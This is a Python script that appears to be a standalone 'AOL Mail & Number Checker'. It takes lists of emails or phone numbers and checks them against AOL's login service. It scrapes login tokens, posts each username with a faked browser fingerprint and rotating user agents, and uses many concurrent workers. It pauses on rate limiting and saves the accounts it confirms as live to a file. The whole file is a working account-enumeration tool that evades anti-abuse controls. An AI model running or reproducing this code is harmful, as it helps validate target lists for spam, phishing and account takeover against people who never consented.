import asyncio
import os
import sys
import time

import colorama
from colorama import Fore,init
import pypeln as pl
from aiohttp import ClientSession, TCPConnector
from fake_useragent import UserAgent

init()
ua = UserAgent()

validCount = 0
invalidCount = 0
limitedCount = 0

class YahooChecker:
    def __init__(self):
        self.banner()
        self.load()
        loop = asyncio.get_event_loop()
        future = asyncio.ensure_future(self.run())
        loop.run_until_complete(future)

    def banner(self):
        #region Banner
        print(f'''{Fore.GREEN}

\t\t _____    _       _           ______
\t\t|_   _|  (_)     | |         |___  /
\t\t  | |_ __ _ _ __ | | ___ ______ / / 
\t\t  | | '__| | '_ \| |/ _ \______/ /  
\t\t  | | |  | | |_) | |  __/    ./ /   
\t\t  \_/_|  |_| .__/|_|\___|    \_/    
\t\t           | |(TG - @tripleseven)                      
\t\t           |_|  

\t\t\t{Fore.GREEN}AOL Mail & Number Checker{Fore.WHITE}
''')
        #endregion Banner

    def load(self):
        is_targets = False
        while not is_targets:
            filename = input(f'\t{Fore.YELLOW}[{Fore.WHITE}Give Me Your Mail/Number List{Fore.YELLOW}]{Fore.WHITE} > {Fore.WHITE}').replace('"', '').replace('\'', '')
            if '.txt' not in filename:
                filename = filename + '.txt'
            if not os.path.isfile(filename):
                print(f'\t{Fore.RED}[{Fore.WHITE}ERROR{Fore.RED}]{Fore.WHITE}- {Fore.YELLOW}{filename}{Fore.WHITE} Not Found!')
                # time.sleep(1)
                # print(' ' * (45 + len(filename)))
                continue
            else:
                with open(filename) as file:
                    self.targets = [x.split(':')[0].lower() for x in file.read().splitlines() if x]
                if len(self.targets) < 2:
                    print(f'\t{Fore.RED}[{Fore.WHITE}ERROR{Fore.RED}]{Fore.WHITE}- {filename} is empty!')
                    # time.sleep(0.5)
                    # print(' ' * (55 + len(filename)))
                    continue
                else:
                    print(f"\t{Fore.GREEN}[{Fore.WHITE}Loaded{Fore.GREEN}] {Fore.YELLOW}{filename}{Fore.WHITE} loaded with {Fore.GREEN}{len(self.targets)}{Fore.WHITE} leads.\n")
                is_targets = True
        self.targets_fn = filename.split('.')[0]

    async def run(self):
        async with ClientSession(connector=TCPConnector(limit=None, ssl=False)) as session:
            payload = {
                'browser-fp-data': {
                    'language':'en-US',
                    'colorDepth': 24,
                    'deviceMemory': 8,
                    'pixelRatio': 1,
                    'hardwareConcurrency': 12,
                    'timezoneOffset': '-480',
                    'timezone': 'Asia/Singapore',
                    'sessionStorage': 1,
                    'localStorage': 1,
                    'indexedDb': 1,
                    'openDatabase': 1,
                    'cpuClass': 'unknown',
                    'platform': 'Win32',
                    'doNotTrack': '1',
                    'plugins': {
                        'count': 3,
                        'hash': 'e43a8bc708fc490225cde0663b28278c'
                    },
                    'canvas': 'canvas winding:yes~canvas',
                    'webgl': 1,
                    'webglVendorAndRenderer': 'Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 3070 Direct3D11 vs_5_0 ps_5_0, D3D11-27.21.14.6627)',
                    'adBlock': 0,
                    'hasLiedLanguages': 0,
                    'hasLiedResolution': 0,
                    'hasLiedOs': 0,
                    'hasLiedBrowser': 0,
                    'touchSupport': {
                        'points': 0,
                        'event': 0,
                        'start': 0
                    },
                    'fonts': {
                        'count': 48,
                        'hash': '62d5bbf307ed9e959ad3d5ad6ccd3951'
                    },
                    'audio': '124.04347527516074',
                    'resolution': {
                        'w': '1920',
                        'h': '1080'
                    },
                    'availableResolution': {
                        'w': '1040',
                        'h': '1920'
                    },
                    'ts': {
                        'serve': 1620489627957,
                        'render': 1620489626853
                    }
                },
                'crumb': '',
                'acrumb': '',
                'sessionIndex': '',
                'displayName': '',
                'deviceCapability': {
                    'pa': {
                        'status': False
                    }
                },
                'countryCodeIntl': 'AS',
                'username': '',
                'passwd': '',
                'signin': 'Next'
            }
            async def create_session(user_agent):
                global limitedCount
                header = {
                    'User-Agent': user_agent
                }
                async with session.get('https://login.aol.com', headers=header) as query:
                    response = await query.text()
                    try:
                        d1 = response.split('name="crumb" value="')[1].split('"')[0]
                        d2 = response.split('name="acrumb" value="')[1].split('"')[0]
                        d3 = response.split('name="sessionIndex" value="')[1].split('"')[0]
                    except Exception as e:
                        # print(e)
                        # print(f"Error = {response}")
                        if "rate limited" in response:
                            limitedCount +=1
                            print(f"{Fore.YELLOW}[RATE LIMITED] - Waiting 1 min")
                            time.sleep(60)
                            try:
                                response = await query.text()
                                d1 = response.split('name="crumb" value="')[1].split('"')[0]
                                d2 = response.split('name="acrumb" value="')[1].split('"')[0]
                                d3 = response.split('name="sessionIndex" value="')[1].split('"')[0]
                            except Exception as e:
                                print("Failure")
                                return sys.exit()   
                    return (d1, d2, d3)
                    
            async def status(response, target):
                global validCount,invalidCount
                if not target.startswith('+'):
                    target = f'+{target}'
                if 'Sorry, we don&#x27;t recognize this' in response:
                    invalidCount +=1
                    print(f'\t[{(self.targets.index(target) + 1)}/{len(self.targets)}]{Fore.RED}[{Fore.WHITE}DEAD{Fore.RED}]{Fore.WHITE} => {target}')
                elif '/account/challenge/recaptcha/redirect?done' in response:
                    validCount+=1
                    print(f'\t[{(self.targets.index(target) + 1)}/{len(self.targets)}]{Fore.GREEN}[{Fore.WHITE}LIVE{Fore.GREEN}]{Fore.WHITE} => {target} [{Fore.GREEN}✓{Fore.WHITE}]')
                    with open(f'AOL_VALID_{self.targets_fn}.txt', 'a+') as file:
                        file.write(f'{target}\n')

            async def check(target):
                global limitedCount
                try:
                    target = target.replace('+', '')
                    user_agent = ua.chrome
                    d1, d2, d3 = await create_session(user_agent)
                    payload['crumb'] = d1
                    payload['acrumb'] = d2
                    payload['sessionIndex'] = d3
                    payload['username'] = target
                    headers = {
                        'DNT': '1',
                        'Host': 'login.aol.com',
                        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
                        'sec-ch-ua-mobile': '?0',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': user_agent
                    }
                    async with session.post('https://login.aol.com', data=payload, headers=headers) as query:
                        response = await query.text()
                        await status(response, target)
                except Exception as error:
                    limitedCount+=1
                    return None

            count = int(input(f'\t{Fore.YELLOW}[{Fore.WHITE}Thread Count{Fore.YELLOW}]{Fore.WHITE} > {Fore.WHITE}').replace('"', '').replace('\'', ''))
            await pl.task.each(
                check, self.targets, workers=count,
            )


if __name__ == '__main__':
    print('\33]0;AOL Valid Checker by Triple-7\a', end='', flush=True)
    os.system("clear")
    try:
        YahooChecker()
        print(f"\t{Fore.GREEN}[+]{Fore.WHITE}============================={Fore.GREEN}[+]{Fore.WHITE}")
        print(f"\tValid Found => {Fore.GREEN}{validCount}{Fore.WHITE}")
        print(f"\tInvalid Found => {Fore.RED}{invalidCount}{Fore.WHITE}")
        print(f"\tLimited => {Fore.CYAN}{limitedCount}{Fore.WHITE}")
    except KeyboardInterrupt:
        sys.exit()
